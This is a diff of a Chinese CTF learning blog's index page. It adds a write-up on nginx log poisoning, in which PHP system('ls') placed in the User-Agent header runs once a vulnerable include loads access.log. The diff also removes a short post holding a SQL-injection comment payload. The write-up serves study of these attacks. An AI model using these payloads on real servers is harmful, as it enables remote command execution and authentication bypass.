@@ -73,6 +73,82 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-终于轮到了日志注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/16/%E7%BB%88%E4%BA%8E%E8%BD%AE%E5%88%B0%E4%BA%86%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2025-04-16T13:22:42.871Z" itemprop="datePublished">2025-04-16</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/04/16/%E7%BB%88%E4%BA%8E%E8%BD%AE%E5%88%B0%E4%BA%86%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/">终于轮到了日志注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>久仰日志注入大名，今天来分析分析。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>冒号被过滤，不能用伪协议了。直接上日志注入。</p>
+<p>先抓包看看响应头 <strong><code>server:</code></strong> 字段，确定是什么服务器软件。（浏览器 F12 也自带查看响应头的工具）</p>
+<p>我抓出来是 <strong><code>server: nginx/1.20.1</code></strong> ，服务器为 <strong>nginx</strong>。上网查资料，nginx 日志文件位置为： <strong><code>/var/log/nginx/access.log</code></strong> ，一会儿要用。</p>
+<p>大多数服务器日志会记录以下信息：</p>
+<ul>
+<li><strong>时间戳</strong>：请求发生的日期和时间。</li>
+<li><strong>客户端IP</strong>：访问者的IP地址。</li>
+<li><strong>请求方法</strong>：如 <code>GET</code>、<code>POST</code>、<code>PUT</code> 等。</li>
+<li><strong>请求路径</strong>：访问的URL或文件路径（如 <code>/index.html</code>）。</li>
+<li><strong>HTTP状态码</strong>：如 <code>200</code>（成功）、<code>404</code>（未找到）、<code>500</code>（服务器错误）。</li>
+<li><strong>User-Agent</strong>：客户端浏览器或设备信息（可能包含攻击载荷）。</li>
+<li><strong>Referer</strong>：用户从哪个页面跳转而来（可能泄露敏感URL）。</li>
+<li><strong>请求参数</strong>：GET&#x2F;POST参数（可能记录敏感数据，如密码、令牌等）。</li>
+</ul>
+<p>也就是说可以在请求报文中修改部分信息，插入 PHP 代码，再包含日志文件（前面讲过只有 PHP 代码会被解析，文本会直接返回前端），以达到执行我们需要的命令的目的。</p>
+<p>试试看：</p>
+<p>第一次发包修改请求体为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=&lt;?php system(&#x27;ls&#x27;) ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第二次发包修改请求行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=/var/log/nginx/access.log HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>得到了一大堆日志文本，并没有 flag ，原来是日志文件里没有记录请求体，emmmmmm……</p>
+<p>但日志文件里记录了请求头，再来一次！</p>
+<p>第一次发包修改请求头<code>User-Agent</code>为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36&lt;?php system(&#x27;ls&#x27;) ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在一堆日志的最后找到了 <code>fl0g.php index.php</code> ，总算是成了。</p>
+<p>接下来只需要查看文件 <code>fl0g.php</code> 的内容就好，OK。（PS：一大堆日志有点瞎眼，flag 难找）</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://traveler2000.github.io/2025/04/16/%E7%BB%88%E4%BA%8E%E8%BD%AE%E5%88%B0%E4%BA%86%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/" data-id="cm9jypwap00279guhbqayeoeu" data-title="终于轮到了日志注入" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-php伪协议之input" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/" class="article-date">
@@ -116,7 +192,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/" data-id="cm9ikwx610008vcuh9w585rmj" data-title="PHP 伪协议之 php://input" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/" data-id="cm9jypwac00089guhcygu8wlc" data-title="PHP 伪协议之 php://input" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -173,7 +249,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/15/%E4%B8%80%E4%BA%9B%E8%BE%A8%E6%9E%90/" data-id="cm9ikwx63000bvcuhf7rcc49v" data-title="一些辨析" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/15/%E4%B8%80%E4%BA%9B%E8%BE%A8%E6%9E%90/" data-id="cm9jypwad000c9guh6ro0fe1q" data-title="一些辨析" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -284,7 +360,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/15/%E5%A4%9A%E5%B1%82%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/" data-id="cm9ikwx67000vvcuhhk72ct1p" data-title="多层函数绕过过滤" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/15/%E5%A4%9A%E5%B1%82%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4/" data-id="cm9jypwan001t9guhfbqaasig" data-title="多层函数绕过过滤" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -441,7 +517,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/14/data%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cm9ikwx63000cvcuh0c14cht3" data-title="data:// 伪协议" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/14/data%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cm9jypwaf000g9guh87x145c7" data-title="data:// 伪协议" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -600,7 +676,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cm9ikwx6c002evcuh2lk65c25" data-title="文件包含与 php:// 伪协议" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/" data-id="cm9jypwap00249guh1oi83ld9" data-title="文件包含与 php:// 伪协议" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -645,7 +721,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/14/%E5%85%B3%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/" data-id="cm9ikwx66000nvcuh9sds9gdg" data-title="关于服务器的知识（持续增加）" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/14/%E5%85%B3%E4%BA%8E%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/" data-id="cm9jypwal001m9guh6hfqffzr" data-title="关于服务器的知识（持续增加）" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -705,7 +781,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/14/%E5%85%B3%E4%BA%8E%E2%80%9C%E7%A9%BA%E7%99%BD%E2%80%9D%E7%BD%91%E9%A1%B5%E6%97%A0%20JavaScript%20%E4%BB%A3%E7%A0%81%E5%8D%B4%E6%9C%89%E5%BC%B9%E7%AA%97%E7%9A%84%E9%97%AE%E9%A2%98/" data-id="cm9ikwx65000ivcuhdnzfgs6o" data-title="关于“空白”网页无 JavaScript 代码却有弹窗的问题" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/14/%E5%85%B3%E4%BA%8E%E2%80%9C%E7%A9%BA%E7%99%BD%E2%80%9D%E7%BD%91%E9%A1%B5%E6%97%A0%20JavaScript%20%E4%BB%A3%E7%A0%81%E5%8D%B4%E6%9C%89%E5%BC%B9%E7%AA%97%E7%9A%84%E9%97%AE%E9%A2%98/" data-id="cm9jypwak001l9guhha5fclvg" data-title="关于“空白”网页无 JavaScript 代码却有弹窗的问题" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -856,7 +932,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/14/URL%E7%9F%A5%E8%AF%86%E7%82%B9/" data-id="cm9ikwx600006vcuh68b2ccyh" data-title="URL 知识点" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/14/URL%E7%9F%A5%E8%AF%86%E7%82%B9/" data-id="cm9jypwaa00079guhcqmidld4" data-title="URL 知识点" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -900,62 +976,11 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/14/Cookie%E2%98%86/" data-id="cm9ikwx5w0002vcuhhp35a1ao" data-title="Cookie☆" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="http://traveler2000.github.io/2025/04/14/Cookie%E2%98%86/" data-id="cm9jypwa400019guhh6pub6y5" data-title="Cookie☆" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Cookie/" rel="tag">Cookie</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" rel="tag">杂项知识点</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-关于注释" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/04/14/%E5%85%B3%E4%BA%8E%E6%B3%A8%E9%87%8A/" class="article-date">
-  <time class="dt-published" datetime="2025-04-14T04:49:49.106Z" itemprop="datePublished">2025-04-14</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/04/14/%E5%85%B3%E4%BA%8E%E6%B3%A8%E9%87%8A/">关于注释</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p> <code>-- </code> 表示 SQL 标准注释，用于注释单行（注意最后有一空格）。</p>
-<p>当网站存在<strong>尾部空格过滤</strong>的功能时，将会无法正确进行 SQL 注入<br>例如：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;a&#x27;</span> <span class="keyword">or</span> <span class="literal">true</span> <span class="comment">--&#x27; AND password=&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>此处注入语句尾部空格被去掉，无法正常注入。<br>可用 MySQL 的单行注释符 <code>#</code> 来代替，不需要额外添加空格，更加简单有效。<br>也可在 <code>-- </code> 后加上使尾部空格不会被过滤的其他字符，如 <code>-- a</code> ，有用但不推荐。</p>
-<p> <code>#</code> 表示 MySQL 单行注释符，功能与 <code>-- </code> 相同。</p>
-<p>未编码的 <code>#</code> 在URL中被称为片段标识符（ Fragment Identifier ），方便浏览器将页面滚动到对应内容的位置。浏览器不会将 <code>#</code> 后的内容发送到服务器，所以，如果要在导航栏中进行 SQL 注入并使用 <code>#</code> ，需要编码为 <code>%23</code> 。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://traveler2000.github.io/2025/04/14/%E5%85%B3%E4%BA%8E%E6%B3%A8%E9%87%8A/" data-id="cm9ikwx68000yvcuh0xavh727" data-title="关于注释" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
 
     </footer>
   </div>
@@ -1000,7 +1025,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Cookie/" style="font-size: 10px;">Cookie</a> <a href="/tags/PHP/" style="font-size: 20px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/URL/" style="font-size: 10px;">URL</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 20px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 16.67px;">文件包含</a> <a href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 16.67px;">杂项知识点</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 13.33px;">爆破</a>
+      <a href="/tags/Cookie/" style="font-size: 10px;">Cookie</a> <a href="/tags/PHP/" style="font-size: 17.5px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">SQL注入</a> <a href="/tags/URL/" style="font-size: 10px;">URL</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 10px;">信息收集</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 20px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 15px;">文件包含</a> <a href="/tags/%E6%9D%82%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 15px;">杂项知识点</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 12.5px;">爆破</a>
     </div>
   </div>
 
@@ -1022,6 +1047,10 @@
       <ul>
         
           <li>
+            <a href="/2025/04/16/%E7%BB%88%E4%BA%8E%E8%BD%AE%E5%88%B0%E4%BA%86%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/">终于轮到了日志注入</a>
+          </li>
+        
+          <li>
             <a href="/2025/04/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B9%8Binput/">PHP 伪协议之 php://input</a>
           </li>
         
@@ -1035,10 +1064,6 @@
         
           <li>
             <a href="/2025/04/14/data%E4%BC%AA%E5%8D%8F%E8%AE%AE/">data:// 伪协议</a>
-          </li>
-        
-          <li>
-            <a href="/2025/04/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">文件包含与 php:// 伪协议</a>
           </li>
         
       </ul>
